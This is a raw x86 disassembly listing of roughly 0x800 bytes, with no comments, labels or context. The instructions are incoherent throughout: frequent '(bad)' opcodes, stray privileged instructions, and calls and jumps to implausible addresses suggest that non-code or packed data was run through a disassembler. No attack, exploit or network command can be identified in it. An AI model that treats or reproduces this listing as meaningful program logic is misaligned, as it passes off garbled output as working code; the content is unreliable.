  42b34f:	jne    0x42b384
  42b351:	mov    edi,DWORD PTR [edx+0x8f3b18]
  42b357:	add    DWORD PTR [ebx],eax
  42b359:	add    bh,bh
  42b35b:	adc    DWORD PTR [eax],ecx
  42b35d:	adc    DWORD PTR [ebp+0x55],edi
  42b360:	push   es
  42b361:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  42b367:	mov    ebp,DWORD PTR [eax+ebp*1+0x503211d0]
  42b36e:	inc    ebp
  42b36f:	mov    edx,edi
  42b371:	or     al,0xd0
  42b373:	push   eax
  42b374:	(bad)  
  42b375:	jne    0x42b32b
  42b377:	call   0x2aac5c
  42b37c:	inc    ebp
  42b37d:	shl    BYTE PTR [edx],0x84
  42b380:	out    dx,al
  42b381:	add    bh,al
  42b383:	add    BYTE PTR [ebp+esi*2-0x2c7430],bh
  42b38a:	(bad)  
  42b38b:	and    al,al
  42b38d:	fs loope 0x42b38f
  42b390:	inc    ebp
  42b391:	test   DWORD PTR [edi+ecx*1-0x37],edi
  42b395:	scas   al,BYTE PTR es:[edi]
  42b396:	inc    esp
  42b397:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  42b39e:	or     BYTE PTR [ebx-0x97717cb],0x83
  42b3a5:	call   DWORD PTR [edi]
  42b3a7:	shr    ah,0x84
  42b3aa:	xchg   DWORD PTR [eax],eax
  42b3ac:	add    DWORD PTR [eax],eax
  42b3ae:	add    bh,bh
  42b3b0:	dec    ebp
  42b3b1:	and    BYTE PTR [ecx-0x38],dl
  42b3b4:	push   eax
  42b3b5:	dec    DWORD PTR [ebx+0xfd885]
  42b3bb:	mov    BYTE PTR [ebp+0x508bac00],cl
  42b3c1:	mov    WORD PTR [ecx+0x0],ss
  42b3c4:	lea    ecx,[ebx+0x108b20d8]
  42b3ca:	mov    WORD PTR [edx],ds
  42b3cc:	add    BYTE PTR [edi+0xff01ff],al
  42b3d2:	mov    ecx,DWORD PTR [ebp-0x28]
  42b3d5:	push   ecx
  42b3d6:	shl    BYTE PTR [ebp+0x3a],0x8b
  42b3da:	inc    ebp
  42b3db:	in     al,0xeb
  42b3dd:	jno    0x42b36a
  42b3df:	push   edx
  42b3e0:	mov    DWORD PTR [eax-0x28],edx
  42b3e3:	mov    eax,DWORD PTR [ebp+0x20]
  42b3e6:	je     0x42b36f
  42b3e8:	mov    eax,DWORD PTR [ecx]
  42b3ea:	sbb    BYTE PTR [eax],al
  42b3ec:	pop    DWORD PTR [eax]
  42b3ee:	add    esi,eax
  42b3f0:	add    bl,al
  42b3f2:	adc    DWORD PTR [edi],esi
  42b3f4:	jmp    0x8bce0446
  42b3f9:	sub    BYTE PTR [ebp+eax*2-0x63c4cb00],cl
  42b400:	jne    0x42b38d
  42b402:	mov    ecx,DWORD PTR [eax]
  42b404:	in     al,0x75
  42b406:	pop    DWORD PTR [ecx+0x5701]
  42b40c:	push   edx
  42b40d:	inc    DWORD PTR [ebx]
  42b40f:	adc    BYTE PTR [ecx+0x45721cc6],cl
  42b415:	add    BYTE PTR [edi+0x9],dl
  42b418:	call   DWORD PTR [esi]
  42b41a:	and    dl,al
  42b41c:	and    bh,bh
  42b41e:	inc    edi
  42b420:	test   eax,edx
  42b422:	sldt   ebx
  42b425:	xor    al,0x0
  42b427:	pushf  
  42b428:	(bad)  
  42b429:	jmp    0x42b437
  42b42b:	mov    eax,edi
  42b42d:	or     al,0x75
  42b42f:	inc    eax
  42b430:	call   0x42ab38
  42b435:	mov    eax,eax
  42b437:	loopne 0x42b3bd
  42b439:	inc    ebp
  42b43a:	add    BYTE PTR [ebx+0x1451c00],cl
  42b440:	mov    eax,DWORD PTR [ebp+0x20]
  42b443:	add    edi,ecx
  42b445:	add    BYTE PTR [eax],ch
  42b447:	cmp    edi,0x18
  42b44a:	test   DWORD PTR [ebp+0xf],esi
  42b44d:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  42b454:	jne    0x42b458
  42b456:	call   0xffa1af1b
  42b45b:	leave  
  42b45c:	rcr    BYTE PTR [esp+eax*4],0x55
  42b460:	add    ah,ch
  42b462:	add    BYTE PTR [edi-0x48fef979],dh
  42b468:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  42b46f:	inc    esp
  42b470:	mov    ebx,DWORD PTR [eax]
  42b472:	fcom   st(2)
  42b474:	add    BYTE PTR [edi],bl
  42b476:	lea    ecx,[eax-0x18]
  42b479:	(bad)  
  42b47a:	push   DWORD PTR [ecx]
  42b47c:	call   0xffb501de
  42b481:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  42b485:	fstp   DWORD PTR [esi+ebx*8]
  42b488:	push   ebp
  42b489:	pop    ebp
  42b48a:	mov    esi,DWORD PTR [edx-0x38]
  42b48d:	add    DWORD PTR [eax],0x28
  42b490:	mov    edi,DWORD PTR [ebx]
  42b492:	xor    esi,DWORD PTR [edx+0x3]
  42b495:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  42b499:	pop    ebp
  42b49a:	or     al,0x4
  42b49c:	inc    ecx
  42b49d:	push   ebp
  42b49e:	(bad)  
  42b49f:	in     al,dx
  42b4a0:	or     ah,ch
  42b4a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b4a3:	xbegin 0xffc82a99
  42b4a9:	clc    
  42b4aa:	adc    al,0x45
  42b4ac:	div    BYTE PTR [eax+ecx*1]
  42b4af:	pushf  
  42b4b0:	add    bh,al
  42b4b2:	jne    0x42b48c
  42b4b4:	add    DWORD PTR [ebp+0x1b00f89e],0x66710066
  42b4be:	add    eax,DWORD PTR [ebp+0x52]
  42b4c1:	adc    eax,0x60
  42b4c4:	xchg   DWORD PTR [ecx+0x3000fc01],ecx
  42b4ca:	test   DWORD PTR [eax],eax
  42b4cc:	clc    
  42b4cd:	data16 or al,BYTE PTR [ebp+0x45]
  42b4d1:	or     DWORD PTR [ebx-0x3d76d720],0xfffffff8
  42b4d8:	rol    BYTE PTR [ebp+0x45],1
  42b4db:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  42b4e1:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  42b4e7:	push   ebx
  42b4e8:	add    BYTE PTR [edi+0x0],dl
  42b4eb:	push   ecx
  42b4ec:	jge    0x42b521
  42b4ee:	add    BYTE PTR [esi+0x4],dl
  42b4f1:	jne    0x42b558
  42b4f3:	mov    edx,0x457200
  42b4f8:	jmp    0x42b4bc
  42b4fa:	xor    edi,DWORD PTR [ebx]
  42b4fc:	pop    edi
  42b4fd:	cvtdq2ps xmm7,xmm0
  42b500:	ret    0x0
  42b503:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  42b509:	xor    ecx,DWORD PTR [edi]
  42b50b:	add    eax,DWORD PTR [ecx+0x3b]
  42b50e:	push   ebx
  42b50f:	rdpmc  
  42b511:	out    0x8d,al
  42b513:	add    BYTE PTR [eax],cl
  42b515:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  42b51b:	ret    0x450c
  42b51e:	sbb    al,0x8b
  42b520:	cmp    eax,esi
  42b522:	or     cl,al
  42b524:	or     al,0xc2
  42b526:	pop    eax
  42b527:	inc    ebp
  42b528:	add    ecx,DWORD PTR [edi]
  42b52a:	add    esi,DWORD PTR [ebp+0x39]
  42b52d:	invd   
  42b52f:	jge    0x42b53b
  42b531:	mov    eax,0x478ac0
  42b536:	cli    
  42b537:	xor    esp,ecx
  42b539:	mov    ebx,0x5b8ac0
  42b53e:	ret    0x33
  42b541:	mov    eax,0x833b8b
  42b546:	sub    BYTE PTR [ebx],al
  42b548:	inc    ebp
  42b549:	xor    ax,0x9cf8
  42b54d:	inc    bh
  42b54f:	mov    esp,esp
  42b551:	hlt    
  42b552:	test   DWORD PTR [ebp-0x8],esi
  42b555:	mov    eax,DWORD PTR [ebp-0x14]
  42b558:	xor    ecx,DWORD PTR [ebx-0x76478864]
  42b55e:	dec    edi
  42b55f:	or     BYTE PTR [eax],al
  42b561:	jne    0x42b4ec
  42b563:	mov    esi,esp
  42b565:	call   0x77a9412a
  42b56a:	inc    ebp
  42b56b:	mov    DWORD PTR [eax+0x9e4f0c],edi
  42b571:	add    BYTE PTR [ecx-0x3ffe0717],cl
  42b577:	add    BYTE PTR [esi+0x7d],ah
  42b57a:	inc    ebp
  42b57b:	mov    bx,WORD PTR [ebp+0x8]
  42b57f:	add    DWORD PTR [ebp+0x57],0x30c008b
  42b586:	inc    ebp
  42b587:	mov    bx,di
  42b58a:	lock test BYTE PTR [ecx+0x7000801],bh
  42b591:	jge    0x42b554
  42b593:	mov    ecx,DWORD PTR [ebx-0x610613f0]
  42b599:	cli    
  42b59a:	xor    bl,bh
  42b59c:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  42b5a2:	test   BYTE PTR [eax],cl
  42b5a4:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  42b5ab:	cmp    ebp,eax
  42b5ad:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  42b5b4:	test   BYTE PTR [ebp+0x1],bh
  42b5b7:	mov    ebx,0x458a00
  42b5bc:	xor    esi,DWORD PTR [ebx]
  42b5be:	add    esp,DWORD PTR [esi-0x77]
  42b5c1:	pop    ebp
  42b5c2:	loopne 0x42b62a
  42b5c4:	inc    ebp
  42b5c5:	clc    
  42b5c6:	xor    edi,DWORD PTR [ebx]
  42b5c8:	add    esi,DWORD PTR [edx-0x77]
  42b5cb:	data16 fdivr QWORD PTR [ebp-0x49]
  42b5cf:	mov    ebx,0xb78afc
  42b5d4:	hlt    
  42b5d5:	xor    eax,DWORD PTR [edx+0x66]
  42b5d8:	add    BYTE PTR [ebp+0x66],bl
  42b5db:	data16 lock clc 
  42b5de:	inc    edx
  42b5df:	cmp    eax,DWORD PTR [eax]
  42b5e1:	ja     0x42b649
  42b5e3:	psubq  mm7,QWORD PTR [ebp+0x8]
  42b5e7:	ltr    WORD PTR [ebp+0x66]
  42b5eb:	add    esi,eax
  42b5ed:	add    di,WORD PTR [ebp+0x2b]
  42b5f1:	data16 data16 jge 0x42b672
  42b5f5:	mov    ebx,0xe08a8b
  42b5fa:	jge    0x42b62f
  42b5fc:	data16 data16 xor al,0x5d
  42b600:	data16 data16 jne 0x42b5fc
  42b604:	mov    edi,DWORD PTR [ebx]
  42b606:	fdiv   QWORD PTR [edx+0x7d]
  42b609:	data16 data16 jge 0x42b641
  42b60d:	mov    ebx,0x758a66
  42b612:	mov    esi,0x667233
  42b617:	pop    ebp
  42b618:	or     BYTE PTR [esi+0x0],ah
  42b61b:	clc    
  42b61c:	mov    edi,DWORD PTR [ebx]
  42b61e:	lock ja 0x42b5ac
  42b621:	(bad)  
  42b623:	jge    0x42b61c
  42b625:	invd   
  42b627:	pop    ebp
  42b628:	add    BYTE PTR [ebx],al
  42b62a:	(bad)  
  42b62b:	cmp    di,WORD PTR [ebp+0xf]
  42b62f:	data16 sbb bh,BYTE PTR [ebp+0x0]
  42b633:	mov    bx,WORD PTR [ebp-0x10]
  42b637:	pop    bp
  42b639:	fbstp  TBYTE PTR [ebx]
  42b63b:	test   DWORD PTR [ebx],eax
  42b63d:	add    BYTE PTR [ebx],bh
  42b63f:	add    BYTE PTR [esi+0x7d],ah
  42b642:	jge    0x42b5cf
  42b644:	data16 in al,dx
  42b646:	pop    ebp
  42b647:	stc    
  42b648:	bsf    ecx,DWORD PTR [ebp+0x6632009e]
  42b64f:	mov    edi,ebx
  42b651:	in     al,dx
  42b652:	test   BYTE PTR [ebp+0x0],bh
  42b655:	mov    eax,DWORD PTR [eax]
  42b657:	call   0xbd3fafe7
  42b65c:	inc    edx
  42b65d:	sahf   
  42b65e:	add    BYTE PTR [edx],dh
  42b660:	mov    bx,di
  42b663:	call   0x8b4b33f3
  42b668:	add    ebp,esp
  42b66a:	mov    bx,di
  42b66d:	jnp    0x42b695
  42b66f:	mov    DWORD PTR [ebx+0x427df808],ecx
  42b675:	mov    eax,DWORD PTR [eax]
  42b677:	call   0x7c3e41e2
  42b67c:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  42b682:	data16 data16 fistp WORD PTR [ebp+0xe]
  42b687:	xor    DWORD PTR [edi-0x48fff7a9],0xfb66f403
  42b691:	fisttp WORD PTR [ecx-0x7401f77b]
  42b697:	(bad)  
  42b698:	cld    
  42b699:	jne    0x42b6dd
  42b69b:	xor    eax,DWORD PTR [eax]
  42b69d:	mov    esp,DWORD PTR [esi-0x10]
  42b6a0:	sti    
  42b6a1:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  42b6a8:	data16 adc bl,bh
  42b6ab:	push   ebp
  42b6ac:	xor    ecx,DWORD PTR es:[ebx+0x42e4f88b]
  42b6b3:	mov    WORD PTR [eax],es
  42b6b5:	sahf   
  42b6b6:	data16 xor bh,bl
  42b6b9:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  42b6bf:	mov    esp,DWORD PTR [esi-0x14]
  42b6c2:	fisttp WORD PTR [ebx-0x3748a9f2]
  42b6c8:	or     al,0x2b
  42b6ca:	mov    bh,0xba
  42b6cc:	hlt    
  42b6cd:	mov    bh,bl
  42b6cf:	add    BYTE PTR [ecx-0x7446f3cd],cl
  42b6d5:	dec    esi
  42b6d6:	or     al,0x0
  42b6d8:	mov    edi,DWORD PTR [ebx]
  42b6da:	or     BYTE PTR [ebp+0x3b],dh
  42b6dd:	mov    ecx,DWORD PTR [edi]
  42b6df:	fdivr  QWORD PTR [ebx-0x7499ff83]
  42b6e5:	xor    al,0xd8
  42b6e7:	pop    bp
  42b6e9:	lock xor esi,DWORD PTR [ebx]
  42b6ec:	lea    esp,[esi+0x1f]
  42b6ef:	icebp  
  42b6f0:	jb     0x42b6f6
  42b6f2:	add    al,al
  42b6f4:	jge    0x42b702
  42b6f6:	mov    eax,eax
  42b6f8:	fsubr  st,st(3)
  42b6fa:	pop    ebp
  42b6fb:	mov    esi,DWORD PTR [ebx]
  42b6fd:	in     al,0x8d
  42b6ff:	rcr    DWORD PTR [edi],0xc2
  42b702:	jb     0x42b762
  42b704:	add    cl,cl
  42b706:	jge    0x42b714
  42b708:	mov    edx,DWORD PTR [ebp-0x20]
  42b70b:	in     al,dx
  42b70c:	pop    ebp
  42b70d:	data16 data16 or BYTE PTR [esi+edi*4],bh
  42b712:	cmp    di,WORD PTR [ebp+0x0]
  42b716:	mov    ebp,DWORD PTR [ebx]
  42b718:	fdivr  QWORD PTR [esi+0x668a5d]
  42b71e:	cmp    al,0x33
  42b720:	mov    si,0x4e7d
  42b724:	mov    eax,DWORD PTR [eax]
  42b726:	lock inc ebp
  42b728:	mov    esi,DWORD PTR [esi]
  42b72a:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  42b731:	clc    
  42b732:	(bad)  
  42b733:	cmp    edi,DWORD PTR [ebx]
  42b735:	je     0x42b746
  42b737:	push   ebx
  42b738:	loopne 0x42b749
  42b73a:	dec    ecx
  42b73c:	mov    esp,DWORD PTR [edx-0x1c]
  42b73f:	int    0xf1
  42b741:	mov    esi,0x703084d
  42b746:	movlhps xmm6,xmm1
  42b749:	add    BYTE PTR [ebp+0x66],dh
  42b74c:	jmp    0x42b719
  42b74e:	mov    eax,DWORD PTR [ebx]
  42b750:	lock push ebp
  42b752:	ror    DWORD PTR [ebp-0x2972feb3],1
  42b758:	or     bh,dl
  42b75a:	jb     0x42b75a
  42b75c:	add    BYTE PTR [ebx-0x1a7487b3],cl
  42b762:	loopne 0x42b764
  42b764:	jne    0x42b76e
  42b766:	data16 add BYTE PTR [esi+eiz*2],dh
  42b76a:	mov    ecx,ebx
  42b76c:	inc    dx
  42b76e:	icebp  
  42b76f:	add    BYTE PTR [edx+0x66],al
  42b772:	add    bl,cl
  42b774:	mov    dx,0xf2
  42b778:	mov    edx,0x66cb0066
  42b77d:	enter  0x4df1,0x19
  42b781:	pop    edi
  42b782:	jne    0x42b705
  42b784:	mov    esi,DWORD PTR [esi]
  42b786:	call   0x77b74327
  42b78b:	xor    ebp,DWORD PTR [ebx]
  42b78d:	lea    esp,[esi+0x48]
  42b790:	repnz in eax,0x3b
  42b793:	add    BYTE PTR [ebp-0x37],dh
  42b796:	xor    edx,DWORD PTR [ebp-0x15]
  42b799:	in     al,dx
  42b79a:	xor    edx,DWORD PTR [esi+0x40]
  42b79d:	mov    DWORD PTR [edi],0x338545fc
  42b7a3:	clc    
  42b7a4:	add    esi,DWORD PTR ds:0xe85b9c5f
  42b7aa:	ret    0xff
  42b7ad:	dec    DWORD PTR [ebx-0x74f8ae08]
  42b7b3:	xor    eax,0x7c084956
  42b7b8:	add    BYTE PTR [ecx+0x66],ah
  42b7bb:	(bad)  
  42b7bc:	into   
  42b7bd:	bound  eax,QWORD PTR [edx-0x33]
  42b7c0:	add    BYTE PTR [ecx+0x7ce0866],bh
  42b7c6:	mov    edx,0xc7000066
  42b7cb:	or     ah,bh
  42b7cd:	add    BYTE PTR [ebp+0x35c3f866],al
  42b7d3:	inc    edx
  42b7d4:	pushf  
  42b7d5:	add    BYTE PTR [esi+0x66],ah
  42b7d8:	into   
  42b7d9:	ret    
  42b7da:	pop    ebp
  42b7db:	fs push edi
  42b7dd:	add    BYTE PTR [edi-0x723c409a],dh
  42b7e3:	add    edi,edi
  42b7e5:	jne    0x42b83e
  42b7e7:	lea    edx,[ecx+0x1]
  42b7ea:	mov    ebx,0xd64ff1
  42b7ef:	sar    DWORD PTR [ebx],1
  42b7f1:	test   BYTE PTR [ebp+0x3c],dh
  42b7f4:	mov    DWORD PTR [esp+edi*8-0x76],esp
  42b7f8:	push   edi
  42b7f9:	xor    BYTE PTR [ebx],0x35
  42b7fc:	mov    esi,ebx
  42b7fe:	xor    eax,DWORD PTR [eax-0x3c73839a]
  42b804:	cmp    al,0x45
  42b806:	fs pop ebx
  42b808:	mov    ebx,0x9c3b36
  42b80d:	je     0x42b83a
  42b80f:	xor    edi,DWORD PTR [ebx+0x668a33]
  42b815:	mov    WORD PTR [ebx],?
  42b817:	cmp    al,0xbb
  42b819:	fs dec esi
  42b81b:	mov    eax,DWORD PTR [eax]
  42b81d:	pop    edi
  42b81e:	cmp    ecx,ecx
  42b820:	jne    0x42b877
  42b822:	mov    ebp,esp
  42b824:	cld    
  42b825:	push   esi
  42b826:	pop    ebx
  42b827:	inc    ebp
  42b828:	stc    
  42b829:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  42b831:	clc    
  42b832:	test   dl,dl
  42b834:	notrack jmp DWORD PTR [esi+eiz*2+0x5e]
  42b839:	or     bl,al
  42b83b:	or     BYTE PTR [ebx+0x57665100],cl
  42b841:	retf   0x4245
  42b844:	add    BYTE PTR ss:[esi+eiz*2-0x457a3542],bl
  42b84c:	clc    
  42b84d:	add    BYTE PTR [ebx+0x66],bl
  42b850:	dec    edx
  42b852:	mov    edx,DWORD PTR [edi-0x76]
  42b855:	push   edi
  42b856:	add    al,0xb7
  42b858:	xor    al,0xba
  42b85a:	cmp    al,0x8d
  42b85c:	je     0x42b85d
  42b85e:	mov    edx,DWORD PTR [edi-0x46]
  42b861:	push   ecx
  42b862:	lea    edi,[ebx+0x574fff]
  42b868:	push   ecx
  42b869:	cmp    edx,DWORD PTR [ebx+0x75]
  42b86c:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  42b872:	add    BYTE PTR [ebx],dh
  42b874:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  42b87a:	add    BYTE PTR [ebx+esi*1+0x4f64bb3c],cl
  42b881:	mov    ebx,0x3b3b00
  42b886:	jne    0x42b8b3
  42b888:	mov    DWORD PTR [ebx+0x728afc],edi
  42b88e:	xor    esi,DWORD PTR [ebx]
  42b890:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  42b896:	push   edi
  42b897:	cmp    esp,ebp
  42b899:	jne    0x42b89b
  42b89b:	sbb    DWORD PTR [eax],0x8085c3fc
  42b8a1:	clc    
  42b8a2:	dec    ecx
  42b8a3:	pop    ebx
  42b8a4:	sti    
  42b8a5:	add    eax,0xeb8bc075
  42b8aa:	cld    
  42b8ab:	xor    edi,DWORD PTR ds:0xf8c3855e
  42b8b1:	mov    ecx,DWORD PTR [ecx+edx*2]
  42b8b4:	rol    DWORD PTR [ebp-0x37],0xf
  42b8b8:	mov    DWORD PTR [eax],ecx
  42b8ba:	inc    edi
  42b8bb:	(bad)  
  42b8bc:	in     eax,0xf8
  42b8be:	add    bh,bh
  42b8c0:	(bad)  
  42b8c1:	mov    esi,0xc38a5e
  42b8c6:	mov    esi,DWORD PTR [ebx]
  42b8c8:	push   ecx
  42b8c9:	mov    edi,0xfc4ec7
  42b8ce:	test   DWORD PTR [ebp-0x8],edx
  42b8d1:	xor    ax,0x9cc7
  42b8d5:	sub    ebp,eax
  42b8d7:	inc    ebp
  42b8d8:	(bad)  
  42b8d9:	sub    edi,edi
  42b8db:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  42b8e1:	inc    ebp
  42b8e2:	add    BYTE PTR [esi+0x2b],ah
  42b8e5:	or     bh,BYTE PTR [edx+0xf8ac2]
  42b8eb:	cmp    al,0x33
  42b8ed:	mov    edi,DWORD PTR [edx+0xf84e81]
  42b8f3:	(bad)  
  42b8f4:	cmp    esi,DWORD PTR [ebx]
  42b8f6:	je     0x42b8b0
  42b8f8:	push   ebx
  42b8f9:	dec    esi
  42b8fa:	str    ecx
  42b8fd:	cmp    esp,DWORD PTR [edx+0x75]
  42b900:	int    0x33
  42b902:	mov    edi,0x789085f
  42b907:	mov    esp,DWORD PTR [esp+edi*8+0x0]
  42b90b:	leave  
  42b90c:	data16 add al,0xcb
  42b90f:	push   ebp
  42b910:	add    ebp,esp
  42b912:	jne    0x42b900
  42b914:	(bad)  
  42b915:	mov    DWORD PTR [ecx],0xd685f7ec
  42b91b:	clc    
  42b91c:	xlat   BYTE PTR ds:[ebx]
  42b91d:	inc    ebp
  42b91e:	mov    esi,DWORD PTR [eax+edx*2]
  42b921:	pushf  
  42b922:	in     eax,0x8b
  42b924:	add    ah,ch
  42b926:	or     BYTE PTR [edi+0x0],dl
  42b929:	push   ecx
  42b92a:	add    ax,0x72cb
  42b92e:	inc    edx
  42b92f:	add    BYTE PTR [eax],al
  42b931:	inc    ebp
  42b932:	data16 (bad) 
  42b934:	retf   
  42b935:	lock mov edx,0x66f80085
  42b93b:	inc    ebp
  42b93c:	retf   
  42b93d:	xor    eax,ecx
  42b93f:	pushf  
  42b940:	jge    0x42b909
  42b942:	ss cld 
  42b944:	pushf  
  42b945:	test   DWORD PTR [edi-0x8],ebx
  42b948:	je     0x42b98f
  42b94a:	xor    esi,DWORD PTR ds:0x7020840
  42b950:	ror    BYTE PTR [ebp-0x37],0x8d
  42b954:	push   ebp
  42b955:	add    esp,ebp
  42b957:	jb     0x42b8e4
  42b959:	add    BYTE PTR [eax],cl
  42b95b:	dec    ebp
  42b95c:	mov    bh,0x81
  42b95e:	push   esi
  42b95f:	push   edi
  42b960:	adc    DWORD PTR [ecx-0x3c],0x429eff81
  42b967:	xor    al,BYTE PTR [eax]
  42b969:	mov    edx,DWORD PTR [edi+0x10]
  42b96c:	(bad)  
  42b96d:	scas   eax,DWORD PTR es:[edi]
  42b96e:	mov    edx,0x890f003b
  42b973:	in     eax,dx
  42b974:	cld    
  42b975:	add    BYTE PTR [ebx],bh
  42b977:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  42b97b:	dec    ebp
  42b97c:	or     BYTE PTR [ebx],ch
  42b97e:	ret    0x458b
  42b981:	lock jmp 0x42b975
  42b984:	mov    ecx,DWORD PTR [eax]
  42b986:	or     BYTE PTR [edi],al
  42b988:	mov    ecx,eax
  42b98a:	xor    DWORD PTR [edx+0x2],0x0
  42b98e:	mov    bh,0xc1
  42b990:	adc    BYTE PTR [eax],dh
  42b992:	iret   
  42b993:	inc    ebp
  42b994:	mov    DWORD PTR [ebx],0x4dfff8c4
  42b99a:	inc    BYTE PTR [ebx]
  42b99c:	mov    edx,0x661100f8
  42b9a1:	adc    al,bh
  42b9a3:	dec    ecx
  42b9a4:	fisttp WORD PTR [ecx+0x456604c0]
  42b9aa:	add    dh,BYTE PTR ds:0x75e0845
  42b9b0:	ret    0x4d
  42b9b3:	lea    ecx,[ebx+0x18728301]
  42b9b9:	add    BYTE PTR [ebp+0x45],al
  42b9bc:	xor    eax,0xc7009ce9
  42b9c1:	add    al,ch
  42b9c3:	inc    ebp
  42b9c4:	test   DWORD PTR [ebx-0x3eba0708],ecx
  42b9ca:	xor    eax,0x781084d
  42b9cf:	push   edi
  42b9d0:	sahf   
  42b9d1:	push   ecx
  42b9d2:	xor    al,BYTE PTR [ecx+0x32f89e89]
  42b9d8:	inc    ebp
  42b9d9:	cmp    edi,DWORD PTR ds:0xc78b9c76
  42b9df:	or     ah,dh
  42b9e1:	inc    ebp
  42b9e2:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  42b9e8:	xor    ecx,DWORD PTR [ebx-0x74747664]
  42b9ee:	in     al,dx
  42b9ef:	hlt    
  42b9f0:	push   edi
  42b9f1:	push   edi
  42b9f2:	push   ecx
  42b9f3:	push   ecx
  42b9f4:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  42b9fa:	sahf   
  42b9fb:	sahf   
  42b9fc:	xor    dh,BYTE PTR [edx]
  42b9fe:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  42ba04:	or     BYTE PTR [ebp+0x7],al
  42ba07:	mov    eax,ecx
  42ba09:	clc    
  42ba0a:	jb     0x42b9cd
  42ba0c:	add    BYTE PTR [ebp+0x55],cl
  42ba0f:	or     DWORD PTR [edi],0xc251d157
  42ba15:	add    DWORD PTR [ebx+0x32009e],0x8b76453b
  42ba1f:	mov    edi,eax
  42ba21:	or     cl,al
  42ba23:	inc    ebp
  42ba24:	dec    ebp
  42ba25:	mov    eax,DWORD PTR [ecx+0x514d570c]
  42ba2b:	or     WORD PTR [ecx],0x899e
  42ba30:	xor    cl,BYTE PTR [ebx+0x5776fc3b]
  42ba36:	mov    edx,DWORD PTR [ecx+0x8]
  42ba39:	mov    eax,DWORD PTR [ebp-0x8]
  42ba3c:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb262]
  42ba43:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  42ba49:	inc    ebp
  42ba4a:	dec    eax
  42ba4b:	add    ecx,DWORD PTR [ebx+0x574df0f8]
  42ba51:	add    edx,DWORD PTR [ecx-0x8]
  42ba54:	mov    ecx,DWORD PTR [ecx]
  42ba56:	clc    
  42ba57:	or     BYTE PTR [ebp+eax*2+0x4532409e],al
  42ba5e:	mov    ecx,ebp
  42ba60:	clc    
  42ba61:	(bad)  
  42ba62:	popf   
  42ba63:	inc    DWORD PTR [eax]
  42ba65:	ret    0x8b
  42ba68:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  42ba6e:	mov    edi,esp
  42ba70:	hlt    
  42ba71:	test   ecx,esi
  42ba73:	clc    
  42ba74:	or     BYTE PTR [ebp+0x7],al
  42ba77:	xor    al,0xc1
  42ba79:	pushf  
  42ba7a:	jb     0x42baaf
  42ba7c:	add    BYTE PTR [eax-0x3f],al
  42ba7f:	inc    eax
  42ba80:	daa    
  42ba81:	inc    ebp
  42ba82:	inc    ebp
  42ba83:	xor    eax,0x7f80803
  42ba88:	dec    ebp
  42ba89:	sahf   
  42ba8a:	add    esi,DWORD PTR [edx]
  42ba8c:	clc    
  42ba8d:	cmp    DWORD PTR [ecx],ecx
  42ba8f:	or     al,0x8
  42ba91:	add    al,BYTE PTR [ebp+0x2c]
  42ba94:	xor    eax,0x7350845
  42ba99:	or     BYTE PTR [ebp+0x7],cl
  42ba9c:	lea    ebx,[esi-0x748dcdff]
  42baa2:	add    BYTE PTR [eax*2-0x74b21438],cl
  42baa9:	mov    edx,DWORD PTR [eax]
  42baab:	cld    
  42baac:	dec    ebp
  42baad:	push   edi
  42baae:	sub    edx,DWORD PTR [ecx-0x75]
  42bab1:	add    eax,0xf172fc
  42bab6:	or     BYTE PTR [ebp+0x7],cl
  42bab9:	add    eax,ecx
  42babb:	or     al,0x72
  42babd:	add    DWORD PTR [eax],eax
  42babf:	mov    ebx,0x29c2c1
  42bac4:	inc    ebp
  42bac5:	mov    eax,DWORD PTR [ebx]
  42bac7:	cmp    eax,0x3004d1c
  42bacd:	xbegin 0x66c846c7
  42bad3:	clc    
  42bad4:	or     BYTE PTR [ebp+0x45],al
  42bad7:	xor    al,0x35
  42bad9:	pushf  
  42bada:	or     BYTE PTR [ebx+0x454d1007],cl
  42bae0:	lea    eax,[ebp+0x33727501]
  42bae6:	add    cl,ch
  42bae8:	inc    ebp
  42bae9:	add    bl,ch
  42baeb:	add    BYTE PTR [ebx+0x45850845],cl
  42baf1:	je     0x42ba7e
  42baf3:	push   ebx
  42baf4:	or     al,0x85
  42baf6:	dec    ebp
  42baf7:	std    
  42baf8:	mov    bh,bh
  42bafa:	mov    BYTE PTR [ebp-0x75],al
  42bafd:	mov    edi,eax
  42baff:	or     al,0x89
  42bb01:	inc    ebp
  42bb02:	clc    
  42bb03:	mov    esp,esp
  42bb05:	hlt    
  42bb06:	call   DWORD PTR [edi-0x37]
  42bb09:	push   edi
  42bb0a:	or     al,0x51
  42bb0c:	push   ebp
  42bb0d:	xor    ebp,esp
  42bb0f:	mov    esi,0x457251
  42bb14:	xor    eax,0xc7459cc6
  42bb19:	mov    edi,eax
  42bb1b:	or     al,0x85
  42bb1d:	add    al,bh
  42bb1f:	inc    eax
  42bb21:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  42bb25:	or     ah,bh
  42bb27:	inc    eax
  42bb28:	push   edi
  42bb29:	jmp    0x42bb7c
  42bb2b:	mov    eax,DWORD PTR ds:0xe8720c
